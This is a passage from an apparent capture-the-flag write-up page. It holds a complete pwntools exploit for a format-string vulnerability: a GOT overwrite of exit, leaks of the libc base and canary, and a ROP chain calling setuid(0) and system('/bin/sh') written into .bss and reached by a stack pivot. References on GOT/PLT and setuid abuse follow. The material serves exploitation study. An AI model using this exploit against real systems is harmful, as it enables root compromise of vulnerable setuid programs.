<a id="__codelineno-6-42" name="__codelineno-6-42" href="#__codelineno-6-42"></a><span class="s1">c</span>
<a id="__codelineno-6-43" name="__codelineno-6-43" href="#__codelineno-6-43"></a><span class="s1">si</span>
<a id="__codelineno-6-44" name="__codelineno-6-44" href="#__codelineno-6-44"></a><span class="s1">nextret</span>
<a id="__codelineno-6-45" name="__codelineno-6-45" href="#__codelineno-6-45"></a><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
<a id="__codelineno-6-46" name="__codelineno-6-46" href="#__codelineno-6-46"></a>
<a id="__codelineno-6-47" name="__codelineno-6-47" href="#__codelineno-6-47"></a><span class="c1">#===========================================================</span>
<a id="__codelineno-6-48" name="__codelineno-6-48" href="#__codelineno-6-48"></a><span class="c1">#                    EXPLOIT GOES HERE</span>
<a id="__codelineno-6-49" name="__codelineno-6-49" href="#__codelineno-6-49"></a><span class="c1">#===========================================================</span>
<a id="__codelineno-6-50" name="__codelineno-6-50" href="#__codelineno-6-50"></a><span class="c1"># Arch:     amd64-64-little</span>
<a id="__codelineno-6-51" name="__codelineno-6-51" href="#__codelineno-6-51"></a><span class="c1"># RELRO:      Partial RELRO</span>
<a id="__codelineno-6-52" name="__codelineno-6-52" href="#__codelineno-6-52"></a><span class="c1"># Stack:      No canary found</span>
<a id="__codelineno-6-53" name="__codelineno-6-53" href="#__codelineno-6-53"></a><span class="c1"># NX:         NX enabled</span>
<a id="__codelineno-6-54" name="__codelineno-6-54" href="#__codelineno-6-54"></a><span class="c1"># PIE:        No PIE (0x400000)</span>
<a id="__codelineno-6-55" name="__codelineno-6-55" href="#__codelineno-6-55"></a><span class="c1"># SHSTK:      Enabled</span>
<a id="__codelineno-6-56" name="__codelineno-6-56" href="#__codelineno-6-56"></a><span class="c1"># IBT:        Enabled</span>
<a id="__codelineno-6-57" name="__codelineno-6-57" href="#__codelineno-6-57"></a><span class="c1"># Stripped:   No</span>
<a id="__codelineno-6-58" name="__codelineno-6-58" href="#__codelineno-6-58"></a>
<a id="__codelineno-6-59" name="__codelineno-6-59" href="#__codelineno-6-59"></a><span class="k">def</span><span class="w"> </span><span class="nf">send_fmt</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
<a id="__codelineno-6-60" name="__codelineno-6-60" href="#__codelineno-6-60"></a>    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;printf on your input and then exit.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<a id="__codelineno-6-61" name="__codelineno-6-61" href="#__codelineno-6-61"></a>
<a id="__codelineno-6-62" name="__codelineno-6-62" href="#__codelineno-6-62"></a><span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
<a id="__codelineno-6-63" name="__codelineno-6-63" href="#__codelineno-6-63"></a>
<a id="__codelineno-6-64" name="__codelineno-6-64" href="#__codelineno-6-64"></a><span class="c1">####################################</span>
<a id="__codelineno-6-65" name="__codelineno-6-65" href="#__codelineno-6-65"></a><span class="c1">####### Redirect exit to func ######</span>
<a id="__codelineno-6-66" name="__codelineno-6-66" href="#__codelineno-6-66"></a><span class="c1">####################################</span>
<a id="__codelineno-6-67" name="__codelineno-6-67" href="#__codelineno-6-67"></a>
<a id="__codelineno-6-68" name="__codelineno-6-68" href="#__codelineno-6-68"></a><span class="n">f</span> <span class="o">=</span> <span class="n">FmtStr</span><span class="p">(</span><span class="n">send_fmt</span><span class="p">,</span> <span class="n">offset</span><span class="o">=</span><span class="mi">46</span><span class="p">,</span> <span class="n">padlen</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span> <span class="n">numbwritten</span><span class="o">=</span><span class="mh">0x6c</span><span class="p">)</span>
<a id="__codelineno-6-69" name="__codelineno-6-69" href="#__codelineno-6-69"></a><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;exit&#39;</span><span class="p">],</span> <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">func</span><span class="p">)</span>
<a id="__codelineno-6-70" name="__codelineno-6-70" href="#__codelineno-6-70"></a><span class="n">f</span><span class="o">.</span><span class="n">execute_writes</span><span class="p">()</span>
<a id="__codelineno-6-71" name="__codelineno-6-71" href="#__codelineno-6-71"></a>
<a id="__codelineno-6-72" name="__codelineno-6-72" href="#__codelineno-6-72"></a>
<a id="__codelineno-6-73" name="__codelineno-6-73" href="#__codelineno-6-73"></a><span class="c1">####################################</span>
<a id="__codelineno-6-74" name="__codelineno-6-74" href="#__codelineno-6-74"></a><span class="c1">#### Leak Part #####################</span>
<a id="__codelineno-6-75" name="__codelineno-6-75" href="#__codelineno-6-75"></a><span class="c1">####################################</span>
<a id="__codelineno-6-76" name="__codelineno-6-76" href="#__codelineno-6-76"></a>
<a id="__codelineno-6-77" name="__codelineno-6-77" href="#__codelineno-6-77"></a><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="s1">&#39;%3$p|%161$p|%164$p|&#39;</span><span class="p">)</span>
<a id="__codelineno-6-78" name="__codelineno-6-78" href="#__codelineno-6-78"></a><span class="n">send_fmt</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<a id="__codelineno-6-79" name="__codelineno-6-79" href="#__codelineno-6-79"></a><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Your input is:&#39;</span><span class="p">)</span>
<a id="__codelineno-6-80" name="__codelineno-6-80" href="#__codelineno-6-80"></a><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<a id="__codelineno-6-81" name="__codelineno-6-81" href="#__codelineno-6-81"></a>
<a id="__codelineno-6-82" name="__codelineno-6-82" href="#__codelineno-6-82"></a><span class="n">leaks</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;|&#39;</span><span class="p">)</span>
<a id="__codelineno-6-83" name="__codelineno-6-83" href="#__codelineno-6-83"></a>
<a id="__codelineno-6-84" name="__codelineno-6-84" href="#__codelineno-6-84"></a><span class="n">leak_write23</span><span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leaks</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
<a id="__codelineno-6-85" name="__codelineno-6-85" href="#__codelineno-6-85"></a><span class="n">leak_canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leaks</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
<a id="__codelineno-6-86" name="__codelineno-6-86" href="#__codelineno-6-86"></a><span class="n">rbp_addr</span>    <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leaks</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mh">0xa00</span>
<a id="__codelineno-6-87" name="__codelineno-6-87" href="#__codelineno-6-87"></a>
<a id="__codelineno-6-88" name="__codelineno-6-88" href="#__codelineno-6-88"></a><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak_write23</span> <span class="o">-</span> <span class="mh">0x10e297</span> <span class="c1"># offset of write+23</span>
<a id="__codelineno-6-89" name="__codelineno-6-89" href="#__codelineno-6-89"></a>
<a id="__codelineno-6-90" name="__codelineno-6-90" href="#__codelineno-6-90"></a><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;LIBC Base Address: </span><span class="si">{</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="si">:</span><span class="s1">#x</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
<a id="__codelineno-6-91" name="__codelineno-6-91" href="#__codelineno-6-91"></a><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Canary Value     : </span><span class="si">{</span><span class="n">leak_canary</span><span class="si">:</span><span class="s1">#x</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
<a id="__codelineno-6-92" name="__codelineno-6-92" href="#__codelineno-6-92"></a><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;RBP Address      : </span><span class="si">{</span><span class="n">rbp_addr</span><span class="si">:</span><span class="s1">#x</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
<a id="__codelineno-6-93" name="__codelineno-6-93" href="#__codelineno-6-93"></a><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Exe Base Address : </span><span class="si">{</span><span class="n">exe</span><span class="o">.</span><span class="n">address</span><span class="si">:</span><span class="s1">#x</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
<a id="__codelineno-6-94" name="__codelineno-6-94" href="#__codelineno-6-94"></a>
<a id="__codelineno-6-95" name="__codelineno-6-95" href="#__codelineno-6-95"></a><span class="c1">####################################</span>
<a id="__codelineno-6-96" name="__codelineno-6-96" href="#__codelineno-6-96"></a><span class="c1">#### Write Part ####################</span>
<a id="__codelineno-6-97" name="__codelineno-6-97" href="#__codelineno-6-97"></a><span class="c1">####################################</span>
<a id="__codelineno-6-98" name="__codelineno-6-98" href="#__codelineno-6-98"></a>
<a id="__codelineno-6-99" name="__codelineno-6-99" href="#__codelineno-6-99"></a><span class="n">target_address</span> <span class="o">=</span> <span class="n">exe</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span><span class="o">+</span><span class="mh">0x680</span>
<a id="__codelineno-6-100" name="__codelineno-6-100" href="#__codelineno-6-100"></a>
<a id="__codelineno-6-101" name="__codelineno-6-101" href="#__codelineno-6-101"></a><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Target address: </span><span class="si">{</span><span class="n">target_address</span><span class="si">:</span><span class="s1">#x</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
<a id="__codelineno-6-102" name="__codelineno-6-102" href="#__codelineno-6-102"></a>
<a id="__codelineno-6-103" name="__codelineno-6-103" href="#__codelineno-6-103"></a><span class="c1">###### rop chain generation ########</span>
<a id="__codelineno-6-104" name="__codelineno-6-104" href="#__codelineno-6-104"></a><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">([</span><span class="n">exe</span><span class="p">,</span> <span class="n">libc</span><span class="p">])</span>
<a id="__codelineno-6-105" name="__codelineno-6-105" href="#__codelineno-6-105"></a>
<a id="__codelineno-6-106" name="__codelineno-6-106" href="#__codelineno-6-106"></a><span class="n">binsh</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">))</span>
<a id="__codelineno-6-107" name="__codelineno-6-107" href="#__codelineno-6-107"></a><span class="n">ret</span>         <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">&#39;ret&#39;</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<a id="__codelineno-6-108" name="__codelineno-6-108" href="#__codelineno-6-108"></a>
<a id="__codelineno-6-109" name="__codelineno-6-109" href="#__codelineno-6-109"></a><span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s1">&#39;setuid&#39;</span><span class="p">,</span> <span class="p">[</span><span class="mi">0</span><span class="p">])</span>
<a id="__codelineno-6-110" name="__codelineno-6-110" href="#__codelineno-6-110"></a><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
<a id="__codelineno-6-111" name="__codelineno-6-111" href="#__codelineno-6-111"></a><span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">[</span><span class="n">binsh</span><span class="p">])</span>
<a id="__codelineno-6-112" name="__codelineno-6-112" href="#__codelineno-6-112"></a>
<a id="__codelineno-6-113" name="__codelineno-6-113" href="#__codelineno-6-113"></a><span class="c1">#############################################</span>
<a id="__codelineno-6-114" name="__codelineno-6-114" href="#__codelineno-6-114"></a><span class="c1">#### write ropchain into .bss segment #######</span>
<a id="__codelineno-6-115" name="__codelineno-6-115" href="#__codelineno-6-115"></a><span class="c1">#############################################</span>
<a id="__codelineno-6-116" name="__codelineno-6-116" href="#__codelineno-6-116"></a>
<a id="__codelineno-6-117" name="__codelineno-6-117" href="#__codelineno-6-117"></a><span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">build</span><span class="p">()):</span>
<a id="__codelineno-6-118" name="__codelineno-6-118" href="#__codelineno-6-118"></a>    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">target_address</span><span class="o">+</span><span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="n">idx</span><span class="p">),</span> <span class="n">c</span><span class="p">)</span>
<a id="__codelineno-6-119" name="__codelineno-6-119" href="#__codelineno-6-119"></a>
<a id="__codelineno-6-120" name="__codelineno-6-120" href="#__codelineno-6-120"></a>
<a id="__codelineno-6-121" name="__codelineno-6-121" href="#__codelineno-6-121"></a><span class="c1">######## redirect code execution ##################</span>
<a id="__codelineno-6-122" name="__codelineno-6-122" href="#__codelineno-6-122"></a><span class="n">pop_rsp</span>     <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">&#39;pop rsp&#39;</span><span class="p">,</span> <span class="s1">&#39;ret&#39;</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<a id="__codelineno-6-123" name="__codelineno-6-123" href="#__codelineno-6-123"></a>
<a id="__codelineno-6-124" name="__codelineno-6-124" href="#__codelineno-6-124"></a>
<a id="__codelineno-6-125" name="__codelineno-6-125" href="#__codelineno-6-125"></a>
<a id="__codelineno-6-126" name="__codelineno-6-126" href="#__codelineno-6-126"></a><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">rbp_addr</span><span class="o">-</span><span class="mh">0x4f8</span><span class="p">,</span> <span class="n">pop_rsp</span><span class="p">)</span>        <span class="c1"># ---&gt; printf return address</span>
<a id="__codelineno-6-127" name="__codelineno-6-127" href="#__codelineno-6-127"></a><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">rbp_addr</span><span class="o">-</span><span class="mh">0x4f0</span><span class="p">,</span> <span class="n">target_address</span><span class="p">)</span> <span class="c1"># ---&gt; printf return address+8</span>
<a id="__codelineno-6-128" name="__codelineno-6-128" href="#__codelineno-6-128"></a><span class="c1">#f.write(target_address, 0xdeadbabe)</span>
<a id="__codelineno-6-129" name="__codelineno-6-129" href="#__codelineno-6-129"></a>
<a id="__codelineno-6-130" name="__codelineno-6-130" href="#__codelineno-6-130"></a><span class="n">f</span><span class="o">.</span><span class="n">execute_writes</span><span class="p">()</span>
<a id="__codelineno-6-131" name="__codelineno-6-131" href="#__codelineno-6-131"></a>
<a id="__codelineno-6-132" name="__codelineno-6-132" href="#__codelineno-6-132"></a><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
<p><strong>The Result:</strong></p>
<p><img alt="" src="../images/77e04bffec8a3191a2572dff4812037f.png" /></p>
<h2 id="references">References</h2>
<p>Red Hat blog explaining RELRO modes, GOT/PLT relocation, and memory protections<br />
<a href="https://access.redhat.com/blogs/766093/posts/1975793">RELRO (Partial vs Full) and GOT overwrites</a></p>
<p>Basics of overwriting GOT entries to redirect control flow<br />
<a href="https://outflux.net/blog/archives/2014/01/27/fun-with-pltgot/">GOT/PLT primer for pwning</a></p>
<p>Detailed GOT/PLT behavior for exploitation<br />
<a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html">All about the GOT (ELF internals)</a></p>
<p>Using fake relocation tables to call arbitrary functions via the dynamic linker<br />
<a href="https://dhavalkapil.com/blogs/ret2dl-resolve/">ret2dlresolve technique overview</a></p>
<p>How to hijack exit handlers for code execution<br />
<a href="https://outflux.net/blog/archives/2014/01/27/fun-with-pltgot/#exit-handlers">Abusing exit handlers</a></p>
<p>Exploiting libc exit functions and destructors<br />
<a href="https://research.checkpoint.com/2020/heap-exploitation-on-modern-linux/">Notes on __exit_funcs / tls_dtor_list</a></p>
<p>Forging _IO_FILE structures for exploitation (File Structure Oriented Programming)<br />
<a href="https://sploitfun.wordpress.com/2015/06/26/fsop-file-structure-oriented-programming/">FSOP context on modern glibc</a></p>
<p>Explanation of the endbr64 instruction for Intel CET IBT<br />
<a href="https://lwn.net/Articles/793253/">What endbr64 does (IBT)</a></p>
<p>Presentation on CET, IBT, and SHSTK on Linux<br />
<a href="https://linuxplumbersconf.org/event/4/contributions/547/">CET slide deck (Linux Plumbers)</a></p>
<p>Building ROP chains with pwntools, including ret2csu support<br />
<a href="https://docs.pwntools.com/en/stable/rop/rop.html">Pwntools ROP API docs</a></p>
<p>Sigreturn Oriented Programming with pwntools<br />
<a href="https://docs.pwntools.com/en/stable/rop/srop.html">Pwntools SROP helper docs</a></p>
<p>Official AMD64 System V ABI documentation<br />
<a href="https://refspecs.linuxfoundation.org/elf/x86_64-abi-0.99.pdf">SysV AMD64 ABI doc (Linux)</a></p>
<p>Practical summary of SysV calling conventions<br />
<a href="https://wiki.osdev.org/System_V_ABI">Calling conventions summary (OSDev)</a></p>
<p>Bash documentation on privilege dropping for setuid programs<br />
<a href="https://www.gnu.org/software/bash/manual/bash.html#Bash-Startup-Files">Shells drop privileges when started setuid</a></p>
<p>Dash man page note on setuid privilege behavior<br />
<a href="https://man7.org/linux/man-pages/man1/dash.1.html">Dash shell drops setuid privileges</a></p>
<p>MITRE ATT&amp;CK technique for exploiting setuid binaries<br />
<a href="https://attack.mitre.org/techniques/T1548/001/">MITRE ATT&amp;CK on setuid abuse</a></p>







  
    
  
  


  <aside class="md-source-file">
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="Last update">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="August 24, 2025 00:40:36 UTC">August 24, 2025</span>
  </span>

    
    
    
    
  </aside>





                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "../../../..", "features": ["content.code.copy", "content.action.edit", "content.action.view", "content.tooltips", "navigation.tracking", "navigation.top", "search.share", "search.suggest"], "search": "../../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../../../assets/javascripts/bundle.92b07e13.min.js"></script>
      
    
  </body>
</html>